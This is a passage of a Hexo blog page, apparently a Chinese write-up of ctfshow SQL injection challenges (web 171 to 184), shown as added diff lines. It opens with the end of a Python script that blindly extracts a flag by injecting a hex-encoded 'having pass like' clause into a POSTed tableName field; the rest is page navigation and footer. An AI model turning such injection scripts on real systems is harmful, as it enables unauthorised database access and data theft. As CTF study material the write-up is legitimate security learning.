class="params">s</span>):</span></span><br><span class="line">    zimu = <span class="string">&quot;&quot;</span></span><br><span class="line">    zimu2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        zimu += <span class="built_in">hex</span>(<span class="built_in">ord</span>(i))</span><br><span class="line">    zimu2 = zimu.replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> zimu2</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span> : <span class="string">&quot;ctfshow_user group by pass having pass like &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;0x&quot;</span>+str_to_hex(flag+j+<span class="string">&#x27;%&#x27;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># data = &#123;&#x27;tableName&#x27;: &#x27;ctfshow_user group by pass having pass like &#123;&#125;&#x27;.format(&quot;0x&quot; + str_to_hex(flag + j + &quot;%&quot;))&#125;</span></span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        r = requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;count = 1&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">            exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="18"><a href="#18" class="headerlink" title="18"></a>18</h4>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/03/12/php%E7%89%B9%E6%80%A7/" rel="prev" title="php特性">
+      <i class="fa fa-chevron-left"></i> php特性
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/03/29/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="next" title="反序列化">
+      反序列化 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">sql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="nav-number">1.1.</span> <span class="nav-text">注释符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC%E4%BB%A3%E6%9B%BF"><span class="nav-number">1.2.</span> <span class="nav-text">空格代替</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-171-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">web 171  联合注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#172-%E5%AF%B9%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%E6%9C%89%E9%99%90%E5%88%B6"><span class="nav-number">3.</span> <span class="nav-text">172   对返回结果有限制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#173-%E5%8F%AF%E4%BB%A5%E5%AF%B9%E8%BF%94%E5%9B%9E%E7%9A%84%E7%BB%93%E6%9E%9C%E8%BF%9B%E8%A1%8Cbase64%E7%BC%96%E7%A0%81-%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99"><span class="nav-number">4.</span> <span class="nav-text">173  可以对返回的结果进行base64编码 绕过正则</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#174-%E7%94%A8%E5%88%B0%E4%BA%86replace-%E5%92%8Creverse-%E5%87%BD%E6%95%B0"><span class="nav-number">5.</span> <span class="nav-text">174  用到了replace   和reverse 函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-175-%E8%BF%99%E9%87%8C%E8%BF%87%E6%BB%A4%E4%BA%86ASCII%E8%A1%A8%EF%BC%8C%E5%88%A9%E7%94%A8%E5%88%B0into-outfile%E5%87%BD%E6%95%B0"><span class="nav-number">6.</span> <span class="nav-text">web 175    这里过滤了ASCII表，利用到into outfile函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#176-%E5%BC%80%E5%A7%8B%E6%9C%89%E8%BF%87%E6%BB%A4%E2%80%94%E2%80%94%E5%A4%A7%E5%B0%8F%E5%86%99%E8%BF%87%E6%BB%A4"><span class="nav-number">7.</span> <span class="nav-text">176 开始有过滤——大小写过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#177-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87-09-0A-0D-%E9%83%BD%E5%8F%AF%E4%BB%A5%E6%9B%BF%E4%BB%A3%E7%A9%BA%E6%A0%BC"><span class="nav-number">8.</span> <span class="nav-text">177 空格绕过            %09 %0A %0D +都可以替代空格</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#178"><span class="nav-number">9.</span> <span class="nav-text">178</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#179"><span class="nav-number">10.</span> <span class="nav-text">179</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#180"><span class="nav-number">11.</span> <span class="nav-text">180</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#181-%E8%BF%99%E9%A2%98%E6%9C%89%E5%80%9F%E9%89%B4%E6%84%8F%E4%B9%89"><span class="nav-number">12.</span> <span class="nav-text">181   这题有借鉴意义</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#182-%E8%B7%9F181%E4%B8%80%E6%A0%B7"><span class="nav-number">13.</span> <span class="nav-text">182 跟181一样</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#183-%E8%A1%A5%E5%85%85sql%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D-%E6%96%B0%E7%9A%84%E5%A7%BF%E5%8A%BF"><span class="nav-number">14.</span> <span class="nav-text">183 &#x3D;&#x3D;补充sql正则匹配&#x3D;&#x3D; 新的姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95"><span class="nav-number">14.1.</span> <span class="nav-text">解题方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#184"><span class="nav-number">14.2.</span> <span class="nav-text">184</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#18"><span class="nav-number">14.3.</span> <span class="nav-text">18</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
